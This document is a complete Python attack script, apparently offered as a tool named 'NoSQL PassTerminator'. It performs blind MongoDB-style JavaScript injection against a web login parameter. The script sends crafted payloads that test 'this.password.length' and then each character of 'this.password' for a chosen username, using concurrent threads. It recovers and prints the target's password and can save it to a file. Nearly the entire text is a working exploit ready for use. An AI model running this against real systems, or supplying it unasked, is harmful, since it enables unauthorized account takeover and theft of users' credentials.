import requests
import string
import argparse
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

banner = r"""
╔═══════════════════════════════════════════════════════════════╗
║                🔐 NoSQL PassTerminator by 0xTensai            ║
║         Automated Blind NoSQL Injection Password Cracker      ║
║                MongoDB-style JavaScript Injection             ║
╚═══════════════════════════════════════════════════════════════╝
"""

def parse_request_file(file_path):
    with open(file_path, 'r') as f:
        lines = f.read().splitlines()

    request_line = lines[0]
    method, path, _ = request_line.split()
    host = ''
    headers = {}
    body = ''

    in_body = False
    for line in lines[1:]:
        if line == '':
            in_body = True
            continue
        if not in_body and ':' in line:
            key, value = line.split(":", 1)
            if key.lower() == "host":
                host = value.strip()
            else:
                headers[key.strip()] = value.strip()
        elif in_body:
            body += line
    url = f"https://{host}{path}"
    return url, headers

def get_charset(option, case_option):
    specials = "!@#$%^&*()_+-={}[]|:;<>,.?/~`"
    if option == "1":
        return string.ascii_lowercase if case_option == "1" else \
               string.ascii_uppercase if case_option == "2" else \
               string.ascii_letters
    elif option == "2":
        return string.ascii_lowercase + string.digits if case_option == "1" else \
               string.ascii_uppercase + string.digits if case_option == "2" else \
               string.ascii_letters + string.digits
    elif option == "3":
        return (string.ascii_lowercase + string.digits + specials) if case_option == "1" else \
               (string.ascii_uppercase + string.digits + specials) if case_option == "2" else \
               (string.ascii_letters + string.digits + specials)
    else:
        raise ValueError("Invalid charset option")

def send_payload(url, headers, param, payload, proxies=None):
    data = {param: payload}
    encoded = urlencode(data)
    response = requests.post(url, headers=headers, data=encoded, proxies=proxies)
    return response.text

def detect_password_length(url, headers, param, username, fail_indicator, max_len=30, compare_mode=False):
    print("[*] Detecting password length...")
    base_response = None
    if compare_mode:
        base_response = send_payload(url, headers, param, f"{username}nothing")

    for i in reversed(range(1, max_len + 1)):
        payload = f"{username}' && this.password.length == {i} || 'a'=='b"
        response = send_payload(url, headers, param, payload)
        if (not compare_mode and fail_indicator not in response) or \
           (compare_mode and response != base_response):
            print(f"[+] Password length is {i}")
            return i
    raise Exception("[-] Failed to detect password length")

def try_char(url, headers, param, username, index, char, fail_indicator, base_response, compare_mode):
    payload = f"{username}' && this.password[{index}] == '{char}' || 'a'=='b"
    response = send_payload(url, headers, param, payload)
    if (not compare_mode and fail_indicator not in response) or \
       (compare_mode and response != base_response):
        return char
    return None

def brute_force_password(url, headers, param, username, length, charset, fail_indicator, compare_mode=False):
    password = ""
    base_response = None
    if compare_mode:
        base_response = send_payload(url, headers, param, f"{username}nothing")

    for i in range(length):
        found = False
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {
                executor.submit(
                    try_char, url, headers, param, username, i, char, fail_indicator, base_response, compare_mode
                ): char for char in charset
            }
            for future in as_completed(futures):
                result = future.result()
                if result:
                    password += result
                    print(f"[+] Found char at index {i}: {result}")
                    found = True
                    break
        if not found:
            password += '?'
            print(f"[-] No match at index {i}, inserting '?'")
    return password

if __name__ == "__main__":
    print(banner)

    parser = argparse.ArgumentParser(description="NoSQL Injection Bruteforcer by 0xTensai")
    parser.add_argument("-r", "--request", required=True, help="Path to raw HTTP request file (Burp-style)")
    parser.add_argument("-f", "--fail-string", required=False, help="Failure indicator in response (optional if using --compare-mode)")
    parser.add_argument("-p", "--param", required=True, help="Name of parameter to inject")
    parser.add_argument("-n", "--username", required=True, help="Username to attack (e.g., administrator)")
    parser.add_argument("-o", "--output", help="File to save cracked password")
    parser.add_argument("--max-length", type=int, default=30, help="Max password length to try (default: 30)")
    parser.add_argument("--compare-mode", action="store_true", help="Use response comparison instead of fail string")
    args = parser.parse_args()

    print("\n[?] Choose character set:")
    print("  1) Alphabets only")
    print("  2) Alphabets + Numbers")
    print("  3) Alphabets + Numbers + Special Characters")
    charset_option = input("Enter option (1/2/3): ").strip()

    print("\n[?] Character casing:")
    print("  1) Lowercase only")
    print("  2) Uppercase only")
    print("  3) Both")
    casing_option = input("Enter option (1/2/3): ").strip()

    charset = get_charset(charset_option, casing_option)

    url, headers = parse_request_file(args.request)
    pw_length = detect_password_length(
        url, headers, args.param, args.username,
        args.fail_string, args.max_length,
        compare_mode=args.compare_mode
    )
    password = brute_force_password(
        url, headers, args.param, args.username, pw_length,
        charset, args.fail_string, compare_mode=args.compare_mode
    )
    print(f"\n[✔] Password for {args.username}: {password}")

    if args.output:
        with open(args.output, "w") as f:
            f.write(password + "\n")
        print(f"[✓] Saved to {args.output}")
